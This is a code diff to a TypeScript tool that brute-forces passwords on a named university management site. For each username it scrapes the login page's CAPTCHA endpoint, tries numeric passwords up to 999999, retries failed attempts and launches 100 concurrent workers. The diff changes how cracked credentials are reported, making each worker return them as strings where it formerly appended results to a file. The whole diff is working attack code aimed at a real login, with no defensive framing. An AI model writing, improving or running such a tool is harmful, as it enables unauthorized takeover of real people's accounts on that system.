@@ -1,8 +1,6 @@
 import FormData = require("form-data");
 import fetch from "node-fetch"
 import cheerio = require("cheerio")
-import fs =require( "fs")
-import os = require("os")
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
@@ -19,10 +17,7 @@ export function worker(username:string):Promise<any>{
     try {
       const result = await fetch(baseUrl);
       if (parseInt(password) > 999999 ) {
-        fs.appendFile("result.txt", "faied " + "用户名: " + username + "密码: " + os.EOL, err => {
-          console.log(err);
-        });
-        resolve(false)
+        resolve("failed " + "用户名: " + username + "密码: ")
         return;
       }
       if(success){
@@ -73,11 +68,8 @@ export function worker(username:string):Promise<any>{
       }
       else {
         log("success ", "用户名: ", username, "密码: ", mypass);
-        fs.appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os.EOL, err => {
-          console.log(err);
-        });
         success = true;
-        resolve(true)
+        resolve( "success " + "用户名: " + username + "密码: "+ mypass)
         return ;
       }
       cookieJar.push(iflysse);
@@ -88,7 +80,7 @@ export function worker(username:string):Promise<any>{
         app();//retry
         times--
       }else{
-        reject(err)
+        reject("用户名"+username+"尝试五次仍失败，请排查："+JSON.stringify(err))
       }
     }
   };
@@ -102,7 +94,7 @@ export function worker(username:string):Promise<any>{
       }
     }
   }
-  
+  //控制并发量
   for(let i=0;i<100;i++){
     increase()
     app()
